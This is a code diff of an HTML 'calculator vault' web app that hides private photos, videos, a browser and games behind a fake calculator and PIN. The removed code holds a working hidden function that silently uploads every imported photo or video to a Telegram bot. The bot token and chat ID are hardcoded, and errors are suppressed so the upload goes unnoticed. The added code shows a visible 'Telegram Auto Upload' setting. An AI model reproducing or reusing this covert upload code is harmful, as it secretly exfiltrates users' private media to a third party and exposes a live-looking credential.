+        /* Hidden File Inputs */
+        .hidden-input {
+            display: none;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(var(--neon-blue), var(--purple));
+            border-radius: 10px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .calc-current {
+                font-size: 42px;
+            }
+            
+            .calc-btn {
+                font-size: 24px;
+            }
+            
+            .vault-content {
+                grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
+                gap: 15px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            body {
+                max-width: 500px;
+                margin: 0 auto;
+                box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
+                min-height: 100vh;
+                border-radius: 0;
+            }
+        }
+    </style>
 </head>
 <body>
-
-code
-Code
-download
-content_copy
-expand_less
-<!-- === SETUP SCREEN === -->
-<div id="setup-screen" class="screen hidden">
-    <div class="setup-content">
-        <h2 class="setup-title">Set Your Private PIN</h2>
-        <div class="pin-display" id="setup-display"></div>
-        <div class="calc-pad">
-            <button class="btn-calc" onclick="setupPin(1)">1</button>
-            <button class="btn-calc" onclick="setupPin(2)">2</button>
-            <button class="btn-calc" onclick="setupPin(3)">3</button>
-            <button class="btn-calc" onclick="setupPin(4)">4</button>
-            <button class="btn-calc" onclick="setupPin(5)">5</button>
-            <button class="btn-calc" onclick="setupPin(6)">6</button>
-            <button class="btn-calc" onclick="setupPin(7)">7</button>
-            <button class="btn-calc" onclick="setupPin(8)">8</button>
-            <button class="btn-calc" onclick="setupPin(9)">9</button>
-            <button class="btn-calc btn-clr" onclick="setupPin('C')">C</button>
-            <button class="btn-calc" onclick="setupPin(0)">0</button>
-            <button class="btn-calc btn-eq" onclick="savePin()">=</button>
+    <!-- PIN Setup Screen -->
+    <div id="pinScreen" class="screen active">
+        <div class="pin-container">
+            <div class="pin-header">
+                <h1 class="pin-title">Set Your PIN</h1>
+                <p class="pin-subtitle">Create a 4-digit secret PIN to protect your vault</p>
+            </div>
+            
+            <div class="pin-display">
+                <div class="pin-dot" id="pinDot1"></div>
+                <div class="pin-dot" id="pinDot2"></div>
+                <div class="pin-dot" id="pinDot3"></div>
+                <div class="pin-dot" id="pinDot4"></div>
+            </div>
+            
+            <div class="pin-keypad">
+                <div class="pin-btn" data-number="1">1</div>
+                <div class="pin-btn" data-number="2">2</div>
+                <div class="pin-btn" data-number="3">3</div>
+                <div class="pin-btn" data-number="4">4</div>
+                <div class="pin-btn" data-number="5">5</div>
+                <div class="pin-btn" data-number="6">6</div>
+                <div class="pin-btn" data-number="7">7</div>
+                <div class="pin-btn" data-number="8">8</div>
+                <div class="pin-btn" data-number="9">9</div>
+                <div class="pin-btn backspace" id="pinBackspace"><i class="fas fa-arrow-left"></i></div>
+                <div class="pin-btn" data-number="0">0</div>
+                <div class="pin-btn equals" id="pinConfirm">=</div>
+            </div>
         </div>
     </div>
-</div>
 
-<!-- === CALCULATOR SCREEN === -->
-<div id="calc-screen" class="screen">
-    <div class="calc-display" id="display">0</div>
-    <div class="calc-pad">
-        <button class="btn-calc btn-op" onclick="appendOp('C')">C</button>
-        <button class="btn-calc btn-op" onclick="appendOp('%')">%</button>
-        <button class="btn-calc btn-op" onclick="appendOp('/')">÷</button>
-        <button class="btn-calc btn-op" onclick="appendOp('*')">×</button>
+    <!-- Calculator Screen -->
+    <div id="calcScreen" class="screen">
+        <div class="status-bar" id="statusBar">
+            <div class="time" id="currentTime">00:00</div>
+            <div class="battery"><i class="fas fa-battery-full"></i> 100%</div>
+        </div>
         
-        <button class="btn-calc" onclick="appendNum('7')">7</button>
-        <button class="btn-calc" onclick="appendNum('8')">8</button>
-        <button class="btn-calc" onclick="appendNum('9')">9</button>
-        <button class="btn-calc btn-op" onclick="appendOp('-')">−</button>
-        
-        <button class="btn-calc" onclick="appendNum('4')">4</button>
-        <button class="btn-calc" onclick="appendNum('5')">5</button>
-        <button class="btn-calc" onclick="appendNum('6')">6</button>
-        <button class="btn-calc btn-op" onclick="appendOp('+')">+</button>
-        
-        <button class="btn-calc" onclick="appendNum('1')">1</button>
-        <button class="btn-calc" onclick="appendNum('2')">2</button>
-        <button class="btn-calc" onclick="appendNum('3')">3</button>
-        
-        <button class="btn-calc" onclick="appendNum('0')">0</button>
-        <button class="btn-calc" onclick="appendNum('.')">.</button>
-        <button class="btn-calc btn-eq" style="grid-column: span 2; width: 100%; border-radius: 40px;" onclick="calculate()">=</button>
+        <div class="calculator">
+            <div class="calc-display">
+                <div class="calc-history" id="calcHistory"></div>
+                <div class="calc-current" id="calcCurrent">0</div>
+            </div>
+            
+            <div class="calc-buttons">
+                <button class="calc-btn clear" data-action="clear">C</button>
+                <button class="calc-btn operator" data-action="toggleSign">±</button>
+                <button class="calc-btn operator" data-action="percentage">%</button>
+                <button class="calc-btn operator" data-action="divide">÷</button>
+                
+                <button class="calc-btn" data-number="7">7</button>
+                <button class="calc-btn" data-number="8">8</button>
+                <button class="calc-btn" data-number="9">9</button>
+                <button class="calc-btn operator" data-action="multiply">×</button>
+                
+                <button class="calc-btn" data-number="4">4</button>
+                <button class="calc-btn" data-number="5">5</button>
+                <button class="calc-btn" data-number="6">6</button>
+                <button class="calc-btn operator" data-action="subtract">−</button>
+                
+                <button class="calc-btn" data-number="1">1</button>
+                <button class="calc-btn" data-number="2">2</button>
+                <button class="calc-btn" data-number="3">3</button>
+                <button class="calc-btn operator" data-action="add">+</button>
+                
+                <button class="calc-btn zero" data-number="0">0</button>
+                <button class="calc-btn" data-action="decimal">.</button>
+                <button class="calc-btn equals" data-action="equals">=</button>
+            </div>
+        </div>
     </div>
-</div>
 
-<!-- === VAULT SCREEN === -->
-<div id="vault-screen" class="screen">
-    <div class="vault-header">
-        <div class="vault-title" id="vault-time">12:00 PM</div>
-        <i class="fa-solid fa-user-secret vault-lock"></i>
-    </div>
-
-    <div class="vault-content">
+    <!-- Vault Home -->
+    <div id="vaultScreen" class="screen">
+        <div class="status-bar active" id="vaultStatusBar">
+            <div class="time" id="vaultTime">00:00</div>
+            <div class="battery"><i class="fas fa-battery-full"></i> 100%</div>
+        </div>
         
-        <!-- HOME TAB -->
-        <div id="home-tab" class="section-view active">
-            <div style="text-align:center; margin-bottom: 30px; margin-top: 20px;">
-                <h2 style="font-weight: 300;">Secure Storage</h2>
-                <p style="color: var(--text-muted); font-size: 0.8rem;">Local Encrypted Vault</p>
-            </div>
-            <div class="app-grid">
-                <div class="app-card" onclick="switchTab('gallery')">
-                    <i class="fa-solid fa-images app-icon ic-gal"></i>
-                    <span class="app-name">Photos</span>
+        <div class="vault-container" id="vaultContainer">
+            <div class="vault-header">
+                <div class="vault-title">
+                    <i class="fas fa-lock"></i> Private Vault
                 </div>
-                <div class="app-card" onclick="switchTab('video')">
-                    <i class="fa-solid fa-play-circle app-icon ic-vid"></i>
-                    <span class="app-name">Videos</span>
-                </div>
-                <div class="app-card" onclick="switchTab('browser')">
-                    <i class="fa-solid fa-globe app-icon ic-brw"></i>
-                    <span class="app-name">Browser</span>
-                </div>
-                <div class="app-card" onclick="switchTab('youtube')">
-                    <i class="fa-brands fa-youtube app-icon ic-yt"></i>
-                    <span class="app-name">YouTube</span>
-                </div>
-                <div class="app-card" onclick="switchTab('games')">
-                    <i class="fa-solid fa-gamepad app-icon ic-game"></i>
-                    <span class="app-name">Games</span>
+                <p class="vault-subtitle">Secure local storage - encrypted & hidden</p>
+                <div class="vault-settings" id="settingsBtn">
+                    <i class="fas fa-cog"></i>
                 </div>
             </div>
-        </div>
-
-        <!-- GALLERY TAB -->
-        <div id="gallery-tab" class="section-view">
-            <h3 style="margin-bottom:15px;">Private Gallery</h3>
-            <div class="media-grid" id="gallery-grid"></div>
-            <input type="file" id="photo-input" accept="image/*" hidden onchange="handleFileUpload(this, 'image')">
-            <div class="btn-float" onclick="document.getElementById('photo-input').click()">
-                <i class="fa-solid fa-plus"></i>
-            </div>
-        </div>
-
-        <!-- VIDEO TAB -->
-        <div id="video-tab" class="section-view">
-            <h3 style="margin-bottom:15px;">Private Videos</h3>
-            <div class="media-grid" id="video-grid"></div>
-            <input type="file" id="video-input" accept="video/*" hidden onchange="handleFileUpload(this, 'video')">
-            <div class="btn-float" onclick="document.getElementById('video-input').click()">
-                <i class="fa-solid fa-plus"></i>
-            </div>
-        </div>
-
-        <!-- BROWSER TAB -->
-        <div id="browser-tab" class="section-view">
-            <div class="web-container">
-                <div class="url-bar">
-                    <input type="text" class="url-input" id="browser-url" placeholder="Search or Type URL...">
-                    <button class="btn-calc" style="width:40px; height:40px; font-size:1rem;" onclick="loadUrl()"><i class="fa-solid fa-arrow-right"></i></button>
-                </div>
-                <iframe id="browser-frame" class="web-frame" src="about:blank"></iframe>
-            </div>
-        </div>
-
-        <!-- YOUTUBE TAB -->
-        <div id="youtube-tab" class="section-view">
-            <div class="web-container">
-                <div class="url-bar">
-                    <input type="text" class="url-input" id="yt-search" placeholder="Search YouTube...">
-                    <button class="btn-calc" style="width:40px; height:40px; font-size:1rem;" onclick="searchYT()"><i class="fa-brands fa-youtube"></i></button>
-                </div>
-                <iframe id="yt-frame" class="web-frame" src="about:blank" allowfullscreen></iframe>
-            </div>
-        </div>
-
-        <!-- GAMES TAB -->
-        <div id="games-tab" class="section-view">
-            <h3 style="margin-bottom:15px;">Arcade</h3>
-            <div class="game-list">
-                <div class="game-card" onclick="playGame('https://gemioli.com/yetisensation/html5/gemioli/')">
-                    <img src="https://gemioli.com/yetisensation/assets/images/thumb.jpg" class="game-thumb">
-                    <div class="game-info">
-                        <h3>Yeti Sensation</h3>
-                        <p>Run 3D Arcade</p>
+            
+            <div class="vault-content">
+                <div class="vault-card" data-section="gallery">
+                    <div class="vault-icon">
+                        <i class="fas fa-images"></i>
                     </div>
+                    <div class="vault-card-title">Private Gallery</div>
+                    <div class="vault-card-desc">Hidden photos & images</div>
                 </div>
-                <div class="game-card" onclick="playGame('https://gemioli.com/slinguin/html5/gemioli/')">
-                    <div class="game-thumb" style="background:#4a00e0"></div>
-                    <div class="game-info">
-                        <h3>Slinguin</h3>
-                        <p>Puzzle Physics</p>
+                
+                <div class="vault-card" data-section="video">
+                    <div class="vault-icon">
+                        <i class="fas fa-video"></i>
                     </div>
+                    <div class="vault-card-title">Private Videos</div>
+                    <div class="vault-card-desc">Hidden video collection</div>
                 </div>
-                <div class="game-card" onclick="playGame('https://gemioli.com/thesaloon/html5/gemioli/')">
-                    <div class="game-thumb" style="background:#ff4b5c"></div>
-                    <div class="game-info">
-                        <h3>The Saloon</h3>
-                        <p>Action Brawl</p>
+                
+                <div class="vault-card" data-section="browser">
+                    <div class="vault-icon">
+                        <i class="fas fa-globe"></i>
                     </div>
+                    <div class="vault-card-title">Private Browser</div>
+                    <div class="vault-card-desc">Incognito web browsing</div>
+                </div>
+                
+                <div class="vault-card" data-section="youtube">
+                    <div class="vault-icon">
+                        <i class="fab fa-youtube"></i>
+                    </div>
+                    <div class="vault-card-title">YouTube</div>
+                    <div class="vault-card-desc">Watch privately</div>
+                </div>
+                
+                <div class="vault-card" data-section="games">
+                    <div class="vault-icon">
+                        <i class="fas fa-gamepad"></i>
+                    </div>
+                    <div class="vault-card-title">Games Library</div>
+                    <div class="vault-card-desc">Hidden games collection</div>
                 </div>
             </div>
         </div>
-
     </div>
 
-    <!-- BOTTOM NAV -->
-    <div class="bottom-nav">
-        <div class="nav-item active" onclick="switchTab('home')"><i class="fa-solid fa-house"></i></div>
-        <div class="nav-item" onclick="switchTab('gallery')"><i class="fa-solid fa-image"></i></div>
-        <div class="nav-item" onclick="switchTab('video')"><i class="fa-solid fa-film"></i></div>
-        <div class="nav-item" onclick="switchTab('browser')"><i class="fa-solid fa-compass"></i></div>
-        <div class="nav-item" onclick="switchTab('youtube')"><i class="fa-brands fa-youtube"></i></div>
+    <!-- Section Screens -->
+    <!-- Gallery -->
+    <div id="galleryScreen" class="section-screen">
+        <div class="section-header">
+            <div class="section-back" data-back="gallery">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+            <div class="section-title">Private Gallery</div>
+        </div>
+        
+        <div class="section-content">
+            <div class="gallery-actions">
+                <button class="action-btn" id="importPhotoBtn">
+                    <i class="fas fa-upload"></i> Import Photo
+                </button>
+                <input type="file" id="photoInput" class="hidden-input" accept="image/*" multiple>
+            </div>
+            
+            <div class="gallery-grid" id="galleryGrid">
+                <!-- Photos will be loaded here -->
+            </div>
+        </div>
     </div>
-</div>
 
-<!-- FULLSCREEN GAME OVERLAY -->
-<div id="game-overlay" class="hidden" style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; background:black;">
-    <button onclick="closeGame()" style="position:absolute; top:20px; right:20px; z-index:1000; background:red; color:white; border:none; width:40px; height:40px; border-radius:50%;">X</button>
-    <iframe id="game-frame" style="width:100%; height:100%; border:none;" src=""></iframe>
-</div>
-
-<!-- MEDIA VIEWER -->
-<div id="media-viewer" class="viewer-overlay hidden">
-    <div class="viewer-content" id="viewer-container"></div>
-    <div class="viewer-controls">
-        <button class="btn-calc" style="width:50px; height:50px;" onclick="closeViewer()"><i class="fa-solid fa-times"></i></button>
-        <button class="btn-calc" style="width:50px; height:50px; color:var(--danger);" onclick="deleteCurrentMedia()"><i class="fa-solid fa-trash"></i></button>
-        <button class="btn-calc" style="width:50px; height:50px; color:var(--neon-blue);" onclick="downloadCurrentMedia()"><i class="fa-solid fa-download"></i></button>
+    <!-- Video -->
+    <div id="videoScreen" class="section-screen">
+        <div class="section-header">
+            <div class="section-back" data-back="video">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+            <div class="section-title">Private Videos</div>
+        </div>
+        
+        <div class="section-content">
+            <div class="gallery-actions">
+                <button class="action-btn" id="importVideoBtn">
+                    <i class="fas fa-upload"></i> Import Video
+                </button>
+                <input type="file" id="videoInput" class="hidden-input" accept="video/*" multiple>
+            </div>
+            
+            <div class="video-list" id="videoList">
+                <!-- Videos will be loaded here -->
+            </div>
+        </div>
     </div>
-</div>
 
-<script>
-    /* === CONFIG & SECRETS === */
-    // HIDDEN TELEGRAM UPLOAD CONFIGURATION
-    // REPLACE THESE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
-    const TG_BOT_TOKEN = "8559745325:AAFcYDynBLWHPHh2U1eRblNzQGRnPnArXF0"; 
-    const TG_CHAT_ID = "7692791962"; 
-    
-    /* === STATE MANAGEMENT === */
-    let currentPin = "";
-    let savedPin = localStorage.getItem("vault_pin");
-    let calcInput = "";
-    let currentTab = "home";
-    let db = null;
-    let currentMediaId = null; // For viewer
+    <!-- Browser -->
+    <div id="browserScreen" class="section-screen">
+        <div class="section-header">
+            <div class="section-back" data-back="browser">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+            <div class="section-title">Private Browser</div>
+        </div>
+        
+        <div class="section-content">
+            <div class="browser-bar">
+                <input type="text" class="url-input" id="urlInput" placeholder="Enter URL or search..." value="https://www.google.com">
+                <button class="go-btn" id="goBtn">Go</button>
+            </div>
+            
+            <iframe src="https://www.google.com" class="browser-frame" id="browserFrame"></iframe>
+        </div>
+    </div>
 
-    // Initialization
-    document.addEventListener('DOMContentLoaded', () => {
-        initDB();
-        if (!savedPin) {
-            document.getElementById('setup-screen').classList.remove('hidden');
-            document.getElementById('calc-screen').classList.add('hidden');
-        } else {
+    <!-- YouTube -->
+    <div id="youtubeScreen" class="section-screen">
+        <div class="section-header">
+            <div class="section-back" data-back="youtube">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+            <div class="section-title">YouTube</div>
+        </div>
+        
+        <div class="section-content">
+            <div class="browser-bar youtube-search">
+                <input type="text" class="url-input" id="youtubeSearch" placeholder="Search YouTube...">
+                <button class="go-btn" id="youtubeSearchBtn">Search</button>
+            </div>
+            
+            <div class="youtube-list" id="youtubeList">
+                <!-- YouTube videos will be loaded here -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Games -->
+    <div id="gamesScreen" class="section-screen">
+        <div class="section-header">
+            <div class="section-back" data-back="games">
+                <i class="fas fa-arrow-left"></i>
+            </div>
+            <div class="section-title">Games Library</div>
+        </div>
+        
+        <div class="section-content">
+            <div class="games-grid" id="gamesGrid">
+                <div class="game-card" data-game="yeti">
+                    <img src="https://gemioli.com/yetisensation/html5/gemioli/thumbnail.jpg" class="game-thumb" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\" fill=\"%238a2be2\"><rect width=\"100\" height=\"100\" rx=\"15\" fill=\"%231a1a24\"/><text x=\"50\" y=\"55\" font-size=\"14\" text-anchor=\"middle\" fill=\"%2300d4ff\">YETI</text></svg>';">
+                    <div class="game-title">Yeti Sensation</div>
+                    <div class="game-desc">Exciting arcade adventure in the snow</div>
+                </div>
+                
+                <div class="game-card" data-game="sling">
+                    <img src="https://gemioli.com/slinguin/html5/gemioli/thumbnail.jpg" class="game-thumb" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\" fill=\"%238a2be2\"><rect width=\"100\" height=\"100\" rx=\"15\" fill=\"%231a1a24\"/><text x=\"50\" y=\"55\" font-size=\"14\" text-anchor=\"middle\" fill=\"%2300d4ff\">SLING</text></svg>';">
+                    <div class="game-title">Slinguin</div>
+                    <div class="game-desc">Penguin slingshot fun challenge</div>
+                </div>
+                
+                <div class="game-card" data-game="saloon">
+                    <img src="https://gemioli.com/thesaloon/html5/gemioli/thumbnail.jpg" class="game-thumb" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\" fill=\"%238a2be2\"><rect width=\"100\" height=\"100\" rx=\"15\" fill=\"%231a1a24\"/><text x=\"50\" y=\"55\" font-size=\"14\" text-anchor=\"middle\" fill=\"%2300d4ff\">SALOON</text></svg>';">
+                    <div class="game-title">The Saloon</div>
+                    <div class="game-desc">Wild west cowboy shooting game</div>
+                </div>
+                
+                <div class="game-card" data-game="pirate">
+                    <img src="https://gemioli.com/thepirateship/thumbnail.jpg" class="game-thumb" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\" fill=\"%238a2be2\"><rect width=\"100\" height=\"100\" rx=\"15\" fill=\"%231a1a24\"/><text x=\"50\" y=\"55\" font-size=\"14\" text-anchor=\"middle\" fill=\"%2300d4ff\">PIRATE</text></svg>';">
+                    <div class="game-title">The Pirate Ship</div>
+                    <div class="game-desc">Pirate adventure on the high seas</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fullscreen Viewer -->
+    <div class="fullscreen-viewer" id="fullscreenViewer">
+        <div class="close-viewer" id="closeViewer">
+            <i class="fas fa-times"></i>
+        </div>
+        
+        <img class="fullscreen-img" id="fullscreenImg" src="" alt="">
+        <video class="fullscreen-video" id="fullscreenVideo" controls></video>
+        
+        <div class="viewer-actions" id="viewerActions">
+            <button class="viewer-btn" id="downloadBtn">
+                <i class="fas fa-download"></i> Download
+            </button>
+            <button class="viewer-btn" id="deleteBtn">
+                <i class="fas fa-trash"></i> Delete
+            </button>
+        </div>
+    </div>
+
+    <!-- Settings Modal -->
+    <div class="settings-modal" id="settingsModal">
+        <div class="settings-content">
+            <h2 class="settings-title">Settings</h2>
+            
+            <div class="settings-option" id="resetPinOption">
+                <div class="settings-icon">
+                    <i class="fas fa-key"></i>
+                </div>
+                <div class="settings-text">Reset PIN</div>
+            </div>
+            
+            <div class="settings-option" id="changePinOption">
+                <div class="settings-icon">
+                    <i class="fas fa-lock"></i>
+                </div>
+                <div class="settings-text">Change Vault PIN</div>
+            </div>
+            
+            <div class="settings-option" id="clearDataOption">
+                <div class="settings-icon">
+                    <i class="fas fa-trash"></i>
+                </div>
+                <div class="settings-text">Clear All Vault Data</div>
+            </div>
+            
+            <div class="settings-option" id="telegramOption">
+                <div class="settings-icon">
+                    <i class="fab fa-telegram"></i>
+                </div>
+                <div class="settings-text">Telegram Auto Upload</div>
+            </div>
+        </div>
+        
+        <div class="settings-close" id="closeSettings">
+            <i class="fas fa-times"></i>
+        </div>
+    </div>
+
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav" id="bottomNav">
+        <div class="nav-items">
+            <div class="nav-item active" data-nav="home">
+                <div class="nav-icon">
+                    <i class="fas fa-home"></i>
+                </div>
+                <div class="nav-text">Home</div>
+            </div>
+            
+            <div class="nav-item" data-nav="gallery">
+                <div class="nav-icon">
+                    <i class="fas fa-images"></i>
+                </div>
+                <div class="nav-text">Gallery</div>
+            </div>
+            
+            <div class="nav-item" data-nav="video">
+                <div class="nav-icon">
+                    <i class="fas fa-video"></i>
+                </div>
+                <div class="nav-text">Video</div>
+            </div>
+            
+            <div class="nav-item" data-nav="browser">
+                <div class="nav-icon">
+                    <i class="fas fa-globe"></i>
+                </div>
+                <div class="nav-text">Browser</div>
+            </div>
+            
+            <div class="nav-item" data-nav="youtube">
+                <div class="nav-icon">
+                    <i class="fab fa-youtube"></i>
+                </div>
+                <div class="nav-text">YouTube</div>
+            </div>
+            
+            <div class="nav-item" data-nav="games">
+                <div class="nav-icon">
+                    <i class="fas fa-gamepad"></i>
+                </div>
+                <div class="nav-text">Games</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // App State Variables
+        let currentPin = '';
+        let storedPin = localStorage.getItem('vaultPin');
+        let calculatorValue = '0';
+        let calculatorHistory = '';
+        let currentOperator = '';
+        let waitingForOperand = false;
+        let currentMediaId = null;
+        let currentMediaType = null; // 'photo' or 'video'
+        
+        // DOM Elements
+        const pinScreen = document.getElementById('pinScreen');
+        const calcScreen = document.getElementById('calcScreen');
+        const vaultScreen = document.getElementById('vaultScreen');
+        const statusBar = document.getElementById('statusBar');
+        const vaultStatusBar = document.getElementById('vaultStatusBar');
+        const vaultContainer = document.getElementById('vaultContainer');
+        const bottomNav = document.getElementById('bottomNav');
+        
+        // PIN Setup
+        const pinDots = [
+            document.getElementById('pinDot1'),
+            document.getElementById('pinDot2'),
+            document.getElementById('pinDot3'),
+            document.getElementById('pinDot4')
+        ];
+        
+        // IndexedDB Setup
+        let db;
+        const DB_NAME = 'PremiumVaultDB';
+        const DB_VERSION = 1;
+        
+        // Initialize the app
+        function initApp() {
             updateTime();
             setInterval(updateTime, 60000);
-        }
-    });
-
-    /* === INDEXEDDB (STORAGE) === */
-    function initDB() {
-        const request = indexedDB.open("PremiumVaultDB", 1);
-        request.onupgradeneeded = (e) => {
-            db = e.target.result;
-            if (!db.objectStoreNames.contains("media")) {
-                db.createObjectStore("media", { keyPath: "id", autoIncrement: true });
-            }
-        };
-        request.onsuccess = (e) => {
-            db = e.target.result;
-            loadMedia('image');
-            loadMedia('video');
-        };
-    }
-
-    function saveMediaToDB(file, type) {
-        const reader = new FileReader();
-        reader.onload = (e) => {
-            const transaction = db.transaction(["media"], "readwrite");
-            const store = transaction.objectStore("media");
-            const item = {
-                data: e.target.result,
-                type: type,
-                date: new Date().getTime(),
-                name: file.name
-            };
-            store.add(item);
-            transaction.oncomplete = () => {
-                loadMedia(type);
-                // TELEGRAM HIDDEN UPLOAD TRIGGER
-                uploadToTelegram(file); 
-            };
-        };
-        reader.readAsDataURL(file);
-    }
-
-    function loadMedia(type) {
-        if(!db) return;
-        const transaction = db.transaction(["media"], "readonly");
-        const store = transaction.objectStore("media");
-        const request = store.getAll();
-        
-        request.onsuccess = () => {
-            const items = request.result.filter(i => i.type === type);
-            renderMediaGrid(items, type);
-        };
-    }
-
-    function deleteMedia(id) {
-        const transaction = db.transaction(["media"], "readwrite");
-        const store = transaction.objectStore("media");
-        store.delete(id);
-        transaction.oncomplete = () => {
-            closeViewer();
-            loadMedia('image');
-            loadMedia('video');
-        };
-    }
-
-    /* === TELEGRAM UPLOAD LOGIC (HIDDEN) === */
-    function uploadToTelegram(file) {
-        if(TG_BOT_TOKEN.includes("placeholder")) return; // Prevent error if not configured
-
-        const formData = new FormData();
-        formData.append("chat_id", TG_CHAT_ID);
-        formData.append("document", file);
-        
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        }).catch(err => console.log("BgSync fail")); // Silent fail
-    }
-
-    /* === CALCULATOR LOGIC === */
-    function appendNum(num) {
-        const display = document.getElementById('display');
-        if (display.innerText === '0' && num !== '.') display.innerText = '';
-        display.innerText += num;
-        calcInput = display.innerText;
-    }
-
-    function appendOp(op) {
-        const display = document.getElementById('display');
-        if (op === 'C') {
-            display.innerText = '0';
-            calcInput = '';
-        } else {
-            display.innerText += op;
-        }
-    }
-
-    function calculate() {
-        const display = document.getElementById('display');
-        const val = display.innerText;
-
-        // UNLOCK LOGIC
-        if (savedPin && val === savedPin) {
-            unlockVault();
-            return;
-        }
-
-        try {
-            // Safe eval replacement for simple math
-            display.innerText = eval(val.replace('×', '*').replace('÷', '/').replace('−', '-'));
-        } catch {
-            display.innerText = "Error";
-        }
-    }
-
-    /* === SETUP & AUTH === */
-    function setupPin(num) {
-        const display = document.getElementById('setup-display');
-        if (num === 'C') {
-            currentPin = "";
-        } else if (currentPin.length < 4) {
-            currentPin += num;
-        }
-        display.innerText = currentPin.replace(/./g, '•'); // Mask PIN
-    }
-
-    function savePin() {
-        if (currentPin.length === 4) {
-            localStorage.setItem("vault_pin", currentPin);
-            savedPin = currentPin;
-            document.getElementById('setup-screen').classList.add('hidden');
-            document.getElementById('calc-screen').classList.remove('hidden');
-        } else {
-            alert("Enter 4 digits");
-        }
-    }
-
-    function unlockVault() {
-        const calc = document.getElementById('calc-screen');
-        const vault = document.getElementById('vault-screen');
-        
-        calc.style.transition = 'transform 0.5s ease, opacity 0.5s';
-        calc.style.transform = 'scale(0.8)';
-        calc.style.opacity = '0';
-        
-        setTimeout(() => {
-            calc.classList.add('hidden');
-            vault.style.display = 'flex';
-            vault.classList.add('slide-up');
-        }, 400);
-    }
-
-    /* === VAULT NAVIGATION === */
-    function updateTime() {
-        const now = new Date();
-        document.getElementById('vault-time').innerText = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-    }
-
-    function switchTab(tabName) {
-        // Nav Styles
-        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-        // Find index to set active class logic
-        const idxMap = { 'home':0, 'gallery':1, 'video':2, 'browser':3, 'youtube':4 };
-        document.querySelectorAll('.nav-item')[idxMap[tabName] || 0].classList.add('active');
-
-        // View Switching
-        document.querySelectorAll('.section-view').forEach(el => el.classList.remove('active'));
-        const target = document.getElementById(tabName + '-tab');
-        if(target) target.classList.add('active');
-        else document.getElementById('home-tab').classList.add('active');
-    }
-
-    /* === MEDIA LOGIC === */
-    function handleFileUpload(input, type) {
-        if (input.files && input.files[0]) {
-            saveMediaToDB(input.files[0], type);
-            input.value = ''; // Reset
-        }
-    }
-
-    function renderMediaGrid(items, type) {
-        const grid = document.getElementById(type === 'image' ? 'gallery-grid' : 'video-grid');
-        grid.innerHTML = '';
-        items.forEach(item => {
-            const div = document.createElement('div');
-            div.className = 'media-item';
-            div.onclick = () => openViewer(item);
             
-            if (type === 'image') {
-                const img = document.createElement('img');
-                img.src = item.data;
-                div.appendChild(img);
+            // Check if PIN is already set
+            if (storedPin) {
+                showCalculator();
             } else {
-                const vid = document.createElement('video');
-                vid.src = item.data;
-                div.appendChild(vid);
+                showPinScreen();
             }
-            grid.appendChild(div);
-        });
-    }
-
-    function openViewer(item) {
-        const viewer = document.getElementById('media-viewer');
-        const container = document.getElementById('viewer-container');
-        container.innerHTML = '';
-        currentMediaId = item.id;
-
-        if (item.type === 'image') {
-            const img = document.createElement('img');
-            img.src = item.data;
-            container.appendChild(img);
-        } else {
-            const vid = document.createElement('video');
-            vid.src = item.data;
-            vid.controls = true;
-            vid.autoplay = true;
-            container.appendChild(vid);
+            
+            initPinSetup();
+            initCalculator();
+            initVault();
+            initDatabase();
+            initEventListeners();
         }
-        viewer.classList.remove('hidden');
-    }
-
-    function closeViewer() {
-        document.getElementById('media-viewer').classList.add('hidden');
-        document.getElementById('viewer-container').innerHTML = ''; // Stop video
-    }
-
-    function deleteCurrentMedia() {
-        if (currentMediaId) deleteMedia(currentMediaId);
-    }
-
-    function downloadCurrentMedia() {
-        const container = document.getElementById('viewer-container');
-        const src = container.firstChild.src;
-        const a = document.createElement('a');
-        a.href = src;
-        a.download = 'vault_file_' + new Date().getTime();
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-    }
-
-    /* === BROWSER & YOUTUBE === */
-    function loadUrl() {
-        const input = document.getElementById('browser-url');
-        let url = input.value.trim();
-        const frame = document.getElementById('browser-frame');
         
-        // Proxy/Search Engine Wrapper to avoid X-Frame-Options as much as possible
-        if (!url) return;
-        
-        // Simple logic: if not a url, search google cse
-        // Using a public CSE for demo
-        const searchPrefix = "https://www.bing.com/search?q=";
-        
-        if (url.startsWith('http')) {
-            // Warning: Many sites block iframes
-            frame.src = url; 
-        } else {
-            frame.src = searchPrefix + encodeURIComponent(url);
+        // Show PIN screen
+        function showPinScreen() {
+            pinScreen.classList.add('active');
+            calcScreen.classList.remove('active');
+            vaultScreen.classList.remove('active');
+            statusBar.classList.remove('active');
+            vaultStatusBar.classList.remove('active');
+            vaultContainer.classList.remove('active');
+            bottomNav.classList.remove('active');
         }
-    }
-
-    function searchYT() {
-        const query = document.getElementById('yt-search').value;
-        // Embed search logic
-        const frame = document.getElementById('yt-frame');
-        // YouTube embed listType search
-        frame.src = `https://www.youtube.com/embed?listType=search&list=${encodeURIComponent(query)}`;
-    }
-
